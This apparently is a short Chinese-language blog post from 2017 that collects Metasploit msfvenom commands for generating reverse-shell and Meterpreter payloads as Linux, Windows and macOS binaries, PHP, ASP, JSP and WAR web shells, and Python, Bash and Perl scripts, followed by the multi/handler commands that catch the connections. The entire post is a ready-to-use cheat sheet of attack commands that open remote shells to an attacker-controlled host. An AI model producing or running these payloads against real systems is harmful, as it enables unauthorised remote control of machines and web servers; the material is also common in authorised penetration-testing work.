---
title: msf下生成各种payload的命令
date: 2017-09-12 14:30:54
tags:
	- 渗透
	- metasploit
categories: 渗透
---

收集一些msf下生成各种payload的命令

<!-- more -->

    List payloads
    msfvenom -l
    
#### Binaries:

##### Linux： 
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

##### Windows
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

##### Mac
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho

#### Web Payloads
    
##### PHP
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php

##### ASP
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

##### JSP
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

##### WAR
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

#### Scripting Paylaods

##### Python 
    msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

##### Bash
    msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

##### Perl
    msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

#### Handlers

``` bash
use exploit/multi/handler

set PAYLOAD <Payload name>

set LHOST <LHOST value>

set LPORT <LPORT value>

set ExitOnSession false

exploit -j -z
```


